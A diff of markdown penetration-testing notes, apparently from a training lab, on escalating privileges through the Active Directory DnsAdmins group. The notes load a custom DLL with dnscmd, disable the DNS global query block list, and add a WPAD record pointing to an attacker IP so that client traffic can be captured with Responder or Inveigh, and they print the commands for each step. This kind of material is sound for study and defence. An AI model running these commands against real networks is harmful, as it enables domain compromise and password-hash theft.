@@ -30,16 +30,23 @@ sudo python3 -m http.server 7777
 ```
 
 - Download the DLL to the target
-- Use the `dnscmd` utility to load a custom DLL with non-privileged user
+- Use the `dnscmd` utility to load a custom DLL with non-privileged user and...
 ```
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 ( Access Denied )
-
-Get-ADGroupMember -Identity DnsAdmins
 ```
 
-- Only DnsAdmins are allowed to perform this
-- Restart the DNS service/Wait for a Server restart
+- Only DnsAdmins are allowed to perform this, as expected. WHOOPS?
+- We need to load this DLL as a DnsAdmin:
+```
+Get-ADGroupMember -Identity DnsAdmins
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadmn\Desktop\adduser.dll
+```
+
+Once the DLL is added we can either restart the DNS service if we have the rights or we would 
+wait for a server restart.
+
+Check our current user's permissions on the DNS Service.
 
 ##### Finding User's SID for the DNS Service
 ```
@@ -107,4 +114,26 @@ DWORD WINAPI kdns_DnsPluginQuery(
 ```
 
 ## Creating a WPAD Record
+
+Membership in this group gives us the rights to disable global-query blocking security, 
+which will block this attack by default.
+
+Server 2008 first introduced the ability to add to a global query block list on a DNS server.
+By default, Web Proxy Automatic Discovery Protocol (WAPD) and Intra-site Automatic Tunneling
+Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite
+vulnerable to hijacking and any domain user can create a computer object or DNS record
+containing those names.
+
+After disabling the global query block list and creating a WPAD record, every machine running
+WAPD with default settings will have it's traffic proxied through our attack machine.
+
+We could use a tool like Responder or Inveigh to perform traffic spoofing and attempt to capture
+password hashes and crack them offline, or perform an SMBRelay attack.
+
+##### Disabling the Global Query Block List
+```
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
+Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local 
+	-ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
+```
 
